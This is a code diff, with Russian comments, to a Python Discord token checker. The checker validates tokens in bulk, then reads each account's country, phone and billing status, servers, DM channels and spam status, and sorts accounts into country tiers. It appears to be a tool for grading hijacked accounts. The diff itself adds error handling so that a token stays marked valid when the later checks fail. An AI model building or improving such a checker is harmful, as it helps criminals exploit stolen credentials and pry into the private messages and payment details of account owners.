@@ -290,48 +290,58 @@ class DiscordAdvancedChecker:
             'total_chats': 0,
             'excluded_chats': 0,
             'tier': None,
+            'check_error': None,  # Ошибка при доп проверках (не влияет на valid)
         }
         
-        # Проверка валидности
+        # Проверка валидности - ЕДИНСТВЕННАЯ проверка которая определяет valid/invalid
         is_valid, user_data = self.check_token_validity(token)
         if not is_valid:
+            result['check_error'] = 'Token invalid'
             return result
         
+        # Токен валиден
         result['valid'] = True
         result['user_id'] = user_data.get('id')
         result['username'] = user_data.get('username')
         result['locale'] = user_data.get('locale', '').lower()
         
-        # Получаем реальную страну несколькими методами
-        country_code = self.get_user_country(token, user_data)
+        # Все дальнейшие проверки - если упадут, токен остается valid
+        try:
+            # Получаем реальную страну несколькими методами
+            country_code = self.get_user_country(token, user_data)
+            
+            # СНГ проверка
+            result['is_cis'] = country_code in self.CIS if country_code else False
+            
+            # Флаги
+            result['flags'] = self.get_user_flags(user_data)
+            
+            # Биллинг и телефон
+            result['has_phone'] = user_data.get('phone') is not None
+            result['has_billing'] = user_data.get('premium_type') is not None or user_data.get('premium') is not None
+            
+            # Получаем сервера и DM
+            guilds = self.get_user_guilds(token)
+            dm_channels = self.get_dm_channels(token)
+            
+            # Фильтруем DM
+            valid_dms = [dm for dm in dm_channels if self._is_valid_dm(dm)]
+            excluded_dms = len(dm_channels) - len(valid_dms)
+            
+            result['total_chats'] = len(guilds) + len(valid_dms)
+            result['excluded_chats'] = excluded_dms
+            
+            # Проспам - проверяем последние сообщения на спам
+            result['spam_status'] = self.check_spam_by_bot_method(token, valid_dms)
+            
+            # Tier (только для непроспама) - используем country_code
+            if result['spam_status'] == 'non_spam':
+                result['tier'] = self.get_country_tier(country_code)
         
-        # СНГ проверка
-        result['is_cis'] = country_code in self.CIS if country_code else False
-        
-        # Флаги
-        result['flags'] = self.get_user_flags(user_data)
-        
-        # Биллинг и телефон
-        result['has_phone'] = user_data.get('phone') is not None
-        result['has_billing'] = user_data.get('premium_type') is not None or user_data.get('premium') is not None
-        
-        # Получаем сервера и DM
-        guilds = self.get_user_guilds(token)
-        dm_channels = self.get_dm_channels(token)
-        
-        # Фильтруем DM
-        valid_dms = [dm for dm in dm_channels if self._is_valid_dm(dm)]
-        excluded_dms = len(dm_channels) - len(valid_dms)
-        
-        result['total_chats'] = len(guilds) + len(valid_dms)
-        result['excluded_chats'] = excluded_dms
-        
-        # Проспам - проверяем последние сообщения на спам
-        result['spam_status'] = self.check_spam_by_bot_method(token, valid_dms)
-        
-        # Tier (только для непроспама) - используем country_code
-        if result['spam_status'] == 'non_spam':
-            result['tier'] = self.get_country_tier(country_code)
+        except Exception as e:
+            # Ошибка в доп проверках - токен остается VALID, но помечаем ошибку
+            result['check_error'] = f'Error during additional checks: {str(e)}'
+            logger.warning(f"⚠️ Ошибка доп проверок для {result['username']}: {e}")
         
         return result
     
@@ -400,6 +410,10 @@ class DiscordAdvancedChecker:
         total = len(results)
         valid_count = len(valid_results)
         invalid_count = total - valid_count
+        
+        # Токены с ошибками доп проверок (valid, но check_error не None)
+        check_errors_count = sum(1 for r in valid_results if r.get('check_error'))
+        
         cis_count = sum(1 for r in valid_results if r['is_cis'])
         
         # Проспам статистика
@@ -434,6 +448,7 @@ class DiscordAdvancedChecker:
             'account_duplicates': acc_dups,
             'valid': valid_count,
             'invalid': invalid_count,
+            'check_errors': check_errors_count,  # Токены с ошибками доп проверок
             'cis': cis_count,
             'spam': {
                 'by_bot': spam_by_bot,
